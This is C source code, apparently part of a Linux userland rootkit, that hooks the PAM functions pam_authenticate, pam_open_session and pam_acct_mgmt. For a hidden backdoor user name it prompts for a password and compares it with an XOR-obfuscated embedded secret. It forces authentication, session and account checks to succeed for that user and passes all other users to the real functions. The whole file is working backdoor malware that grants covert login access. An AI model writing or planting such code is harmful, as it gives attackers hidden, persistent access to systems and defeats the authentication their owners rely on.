int pam_authenticate(pam_handle_t *pamh, int flags)
{   
    char *user = get_username(pamh),
         prompt[512],
         *pw;
    int r = PAM_USER_UNKNOWN;

    hook(CPAM_AUTHENTICATE);
    if(user == NULL) return (long)call(CPAM_AUTHENTICATE, pamh, flags);

    if(is_bduname(user))
    {
        if(process("login")) return (long)call(CPAM_AUTHENTICATE, pamh, flags);

        xor(bd_uname, BD_UNAME);
        (void)snprintf(prompt, sizeof(prompt) - 1, "* Password for %s: ", bd_uname);
        clean(bd_uname);

        (void)pam_prompt(pamh, 1, &pw, "%s", prompt);

        xor(bd_pwd, BD_PWD);
        #ifdef USE_CRYPT
        if(!strcmp(crypt(pw, bd_pwd), bd_pwd)) r = PAM_SUCCESS;
        #else
        if(!strcmp(pw, bd_pwd)) r = PAM_SUCCESS;
        #endif
        clean(bd_pwd);

        return r;
    }

    return (long)call(CPAM_AUTHENTICATE, pamh, flags);
}

int pam_open_session(pam_handle_t *pamh, int flags)
{
    char *user = get_username(pamh);

    hook(CPAM_OPEN_SESSION);

    if(user == NULL) return (long)call(CPAM_OPEN_SESSION, pamh, flags);
    if(is_bduname(user)) return PAM_SUCCESS;
    return (long)call(CPAM_OPEN_SESSION, pamh, flags);
}

int pam_acct_mgmt(pam_handle_t *pamh, int flags)
{
    char *user = get_username(pamh);

    hook(CPAM_ACCT_MGMT);

    if(user == NULL) return (long)call(CPAM_ACCT_MGMT, pamh, flags);
    if(is_bduname(user)) return PAM_SUCCESS;
    return (long)call(CPAM_ACCT_MGMT, pamh, flags);
}
